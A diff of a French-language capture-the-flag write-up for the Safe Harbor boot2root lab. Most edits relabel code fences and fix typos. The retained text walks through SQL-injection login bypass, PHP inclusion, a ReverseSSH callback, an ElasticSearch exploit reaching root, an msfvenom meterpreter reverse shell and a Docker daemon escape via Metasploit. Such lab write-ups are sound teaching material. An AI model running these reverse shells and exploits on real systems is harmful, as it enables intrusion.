@@ -10,7 +10,7 @@ A la recherche d'un CTF pour exercer les skills de pivot, je suis tombé sur [Sa
 
 Ce CTF est de type boot2root donc tourné vers un scénario réaliste.  
 
-```
+```console
 $ sudo nmap -T5 -sC -sV -p- 192.168.56.11
 [sudo] Mot de passe de root : 
 Starting Nmap 7.92 ( https://nmap.org )
@@ -37,7 +37,7 @@ Un classique serveur web accompagné de son serveur SSH. L'auteur a aussi fait l
 
 J'ai eu quelques désagréments sur quelques challenges récents du coup je préfère sortir direct l'artillerie lourde et tester différentes extensions lors de l'énumération sur le serveur web :  
 
-```
+```console
 $ feroxbuster -u http://192.168.56.11/ -w directory-list-2.3-big.txt -x php,html,zip,tar.gz,txt -n
 
  ___  ___  __   __     __      __         __   ___
@@ -89,7 +89,7 @@ Warning: mysqli_num_rows() expects parameter 1 to be mysqli_result, boolean give
 
 Bizarrement la vulnérabilité ne semble pas toujours présente, d'ailleurs SQLmap ne parvient pas à dumper quoi que ce soit mais valide tout de même ce cas de bypass malgré lui puisqu'il accède à la page normalement protégée :  
 
-```
+```console
 $ python sqlmap.py -u http://192.168.56.11/ --data "user=admin&password=admin&s=Login" --risk 3 --level 5 --dbms mysql
 
 --- snip ---
@@ -113,7 +113,7 @@ Jill
 Quinten
 ```
 
-A conserver au cas où. Pour le reste l'URL vers laquelle on est redirigée a un format qui pourrait correspondre à une faille d'inclusion PHP. Je tente donc d'ajouter un préfixe pour tester :  
+À conserver au cas où. Pour le reste l'URL vers laquelle on est redirigée a un format qui pourrait correspondre à une faille d'inclusion PHP. Je tente donc d'ajouter un préfixe pour tester :  
 
 ```
 http://192.168.56.11/OnlineBanking/index.php?p=http://127.0.0.1/welcome
@@ -160,7 +160,7 @@ $ ./reverse-sshx64 -l -p 2244 -v
 
 Et sur le Docker (via le webshell du coup) :  
 
-```
+```console
 $ reverse-ssh -v -p 2424 192.168.56.1 
 2021/12/16 12:08:44 Dialling home via ssh to 192.168.56.1:2244
 2021/12/16 12:08:44 Success: listening at home on 127.0.0.1:8888
@@ -174,7 +174,7 @@ Il faut répéter la commande avec *-s /bin/sh* pour fixer ce contre temps.
 
 Cela établit un tunnel SSH. Il faut ensuite utiliser le client SSH standard pour obtenir le shell via ce tunnel sur le port 8888 (valeur par défaut qui peut se changer avec l'option *-b* de *ReverseSSH*).  
 
-```bash
+```console
 $ ssh -p 8888 brudi@127.0.0.1
 ```
 
@@ -252,20 +252,20 @@ harborbank_apache_v2_2.harborbank_backend (172.20.0.5) at 02:42:ac:14:00:05 [eth
 
 Comme on a vu plus tôt avec les credentials MySQL, le serveur de base de données est sur un autre container nommé *mysql* :  
 
-```
+```console
 /var/www/html/OnlineBanking $ nc mysql 3306 -vz
 mysql (172.20.0.138:3306) open
 ```
 
-On utiliser SSH pour faire une redirection de port locale :  
+On utilise SSH pour faire une redirection de port locale :  
 
-```bash
+```console
 $ ssh -p 8888 -L 33306:172.20.0.138:3306 127.0.0.1
 ```
 
 et ça dumpe :  
 
-```
+```console
 $ mysql -u root -h 127.0.0.1 -P 33306 -p
 Enter password: 
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
@@ -318,7 +318,7 @@ Ces identifiants ne permettent malheureusement pas d'accéder à un compte sur l
 
 Inutile de perdre du temps avec un Proxychains, l'upload d'un Nmap compilé statiquement nous fera gagner un temps précieux sur la découverte du réseau interne.  
 
-```
+```console
 ~ $ ./nmap -sP 172.20.0.8/16 -T5
 
 Starting Nmap 7.11 ( https://nmap.org ) at 2021-12-16 12:42 UTC
@@ -497,7 +497,7 @@ At least you tried
 
 En revanche en testant [un vieil exploit](https://www.exploit-db.com/exploits/36337) en Python on est vite fixé sur ce qu'on peut faire :  
 
-```
+```console
 $ python 36337.py 127.0.0.1
 
 ▓█████  ██▓    ▄▄▄        ██████ ▄▄▄█████▓ ██▓ ▄████▄    ██████  ██░ ██ ▓█████  ██▓     ██▓    
@@ -518,7 +518,7 @@ uid=0(root) gid=0(root) groups=0(root)
 
 R.I.P. ElasticSearch.  
 
-On est root, que espérer de plus ? Un accès en dehors du container bien sûr !  
+On est root, qu'espérer de plus ? Un accès en dehors du container bien sûr !  
 
 Ah! Le binaire Docker n'est pas présent sur la machine et j'ai trop la flemme d'installer une Debian 8, installer Docker, noter les librairies requises, uploader ça etc...  
 
@@ -526,7 +526,7 @@ On va quitter notre *ReverseSSH* et profiter des fonctionnalités de Metasploit.
 
 D'abord générer la backdoor :  
 
-```
+```console
 $ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.56.4 LPORT=4444 -f elf -o /tmp/rev_met
 [-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
 [-] No arch selected, selecting arch: x64 from the payload
@@ -592,7 +592,7 @@ On se fait jeter si on tente de remonter le FS en écriture malgré que l'on soi
 Cette fois c'est la bonne
 -------------------------
 
-Après un moment d'égarement je suis revenu sur ce Docker ElasticSearch qui semblait être le seul à vouloir tomber dans mes mains. Je suis retombé sur cet historique bash qui n'avait pas trop attiré mon attention :  
+Après un moment d'égarement, je suis revenu sur ce Docker ElasticSearch qui semblait être le seul à vouloir tomber dans mes mains. Je suis retombé sur cet historique bash qui n'avait pas trop attiré mon attention :  
 
 ```bash
 ls
@@ -676,7 +676,7 @@ Ce port Docker dispose d'une interface REST et j'ai trouvé quelques astuces [su
 
 On peut ainsi lister les containers de cette façon :  
 
-```
+```console
 $ curl -s http://127.0.0.1:2375/containers/json | python3 -m json.tool
 ```
 
@@ -704,7 +704,7 @@ Il suffit de remplacer le mot *containers* par *images* pour obtenir les images 
 Il nous suffit de réutiliser le module Metasploit mais en spécifiant cette fois le bon nom d'image :  
 
 ```
-$ msf6 exploit(linux/http/docker_daemon_tcp) > set DOCKERIMAGE alpine:3.2
+msf6 exploit(linux/http/docker_daemon_tcp) > set DOCKERIMAGE alpine:3.2
 DOCKERIMAGE => alpine:3.2
 msf6 exploit(linux/http/docker_daemon_tcp) > run
 
@@ -759,7 +759,7 @@ Author: AbsoZed (Dylan Barker)
 
 Un troisième flag est présent dans une archive ZIP mais celle-ci est protégée par mot de passe :  
 
-```
+```console
 root@safeharbor:~# find / -iname "*flag*" 2> /dev/null 
 /root/Flag.txt
 /root/Bonus_Flag_2.txt
